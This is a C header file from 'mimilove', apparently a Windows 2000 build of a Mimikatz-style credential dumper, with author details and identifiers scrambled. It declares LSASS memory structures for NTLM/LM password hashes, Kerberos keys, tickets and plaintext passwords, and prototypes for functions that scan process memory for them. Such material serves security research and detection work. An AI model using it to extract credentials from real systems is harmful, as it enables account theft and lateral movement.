/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"

#define MIMILOVE				L"mimilove"
#define MIMILOVE_VERSION		L"1.0"
#define MIMILOVE_CODENAME		L"Love edition <3"
#define MIMILOVE_FULL			MIMILOVE L" " MIMILOVE_VERSION L" built on " TEXT(__DATE__) L" " TEXT(__TIME__)
#define MIMILOVE_SECOND			L"\"" MIMILOVE_CODENAME L"\""
#define MIMILOVE_SPECIAL		L"Windows 2000 only!                               "

#include "../modules/ydeuclqloutput.h"
#include "../modules/ydeuclqlmemory.h"
#include "../modules/ydeuclqlprocess.h"
#include "../modules/ydeuclqlcrypto_system.h"

typedef struct _KULL_M_MINI_PATTERN {
	DWORD Length;
	BYTE *Pattern;
	LONG offset;
} KULL_M_MINI_PATTERN, *PKULL_M_MINI_PATTERN;

typedef struct _MSV1_0_PRIMARY_CREDENTIAL_50 { 
	LSA_UNICODE_STRING LogonDomainName; 
	LSA_UNICODE_STRING UserName;
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_50, *PMSV1_0_PRIMARY_CREDENTIAL_50;

typedef struct _JoAA_MSV1_0_PRIMARY_CREDENTIALS {
	struct _JoAA_MSV1_0_PRIMARY_CREDENTIALS *next;
	ANSI_STRING Primary;
	LSA_UNICODE_STRING Credentials;
} JoAA_MSV1_0_PRIMARY_CREDENTIALS, *PJoAA_MSV1_0_PRIMARY_CREDENTIALS;

typedef struct _JoAA_MSV1_0_CREDENTIALS {
	struct _JoAA_MSV1_0_CREDENTIALS *next;
	DWORD AuthenticationPackageId;
	PJoAA_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} JoAA_MSV1_0_CREDENTIALS, *PJoAA_MSV1_0_CREDENTIALS;

typedef struct _JoAA_MSV1_0_ENTRY_50 {
	LUID LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk0;
	PVOID unk1;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	DWORD align;
	FILETIME LogonTime;
	PJoAA_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
} JoAA_MSV1_0_ENTRY_50, *PJoAA_MSV1_0_ENTRY_50;

typedef struct _JoAA_MSV1_0_LIST_50 {
	struct _JoAA_MSV1_0_LIST_50 *Flink;
	struct _JoAA_MSV1_0_LIST_50 *Blink;
	DWORD unk0;
	DWORD lowLuid;
	PJoAA_MSV1_0_ENTRY_50 entry;
} JoAA_MSV1_0_LIST_50, *PJoAA_MSV1_0_LIST_50;

typedef struct _JoAA_MSV1_0_LOGON_SESSION_TABLE_50 { // small
	DWORD tag;
	DWORD unk0;
	DWORD count;
	DWORD unk1;
	LIST_ENTRY list; // PJoAA_MSV1_0_LIST_50
	PVOID unkDelete;
	DWORD unk2;
	DWORD unk3;
	DWORD unk4;
	DWORD unk5;
	DWORD unk6;
	DWORD unk7;
} JoAA_MSV1_0_LOGON_SESSION_TABLE_50, *PJoAA_MSV1_0_LOGON_SESSION_TABLE_50;

typedef struct _KERB_HASHPASSWORD_GENERIC {
	DWORD Type;
	SIZE_T Size;
	PBYTE Checksump;
} KERB_HASHPASSWORD_GENERIC, *PKERB_HASHPASSWORD_GENERIC;

typedef struct _KERB_HASHPASSWORD_5 {
	LSA_UNICODE_STRING salt;	// http://tools.ietf.org/html/rfc3962
	KERB_HASHPASSWORD_GENERIC generic;
} KERB_HASHPASSWORD_5, *PKERB_HASHPASSWORD_5;

typedef struct _JoAA_KERBEROS_KEYS_LIST_5 {
	DWORD unk0;		// dword_1233EC8 dd 4
	DWORD cbItem;	// debug048:01233ECC dd 5
	PVOID unk1;
	PVOID unk2;
	//KERB_HASHPASSWORD_5 KeysEntries[ANYSIZE_ARRAY];
} JoAA_KERBEROS_KEYS_LIST_5, *PJoAA_KERBEROS_KEYS_LIST_5;

typedef struct _JoAA_KERBEROS_LOGON_SESSION_50 {
	LIST_ENTRY	Entry;
	ULONG		unk0;
	LUID		LocallyUniqueIdentifier;
	ULONG		unk6;
	ULONG		unk7;
	ULONG		unk8;
	PVOID		unk9;
	ULONG		unk10;
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
	PVOID		unk14;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	LSA_UNICODE_STRING Password;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	ULONG		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PJoAA_KERBEROS_KEYS_LIST_5		pKeyList;
	PVOID		unk24;
	LIST_ENTRY	Tickets_1; // for coders, they're here =)
	LIST_ENTRY	Tickets_2;
	ULONG		unk23;
	LIST_ENTRY	Tickets_3;
} JoAA_KERBEROS_LOGON_SESSION_50, *PJoAA_KERBEROS_LOGON_SESSION_50;

int wmain(int argc, wchar_t *argv[]);
BOOL kcpdclqlsekurlsa_utils_love_search(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION mi, PKULL_M_MINI_PATTERN pa, PVOID * genericPtr);
void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory);
void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory);
PCWCHAR mimilove_kerberos_etype(LONG eType);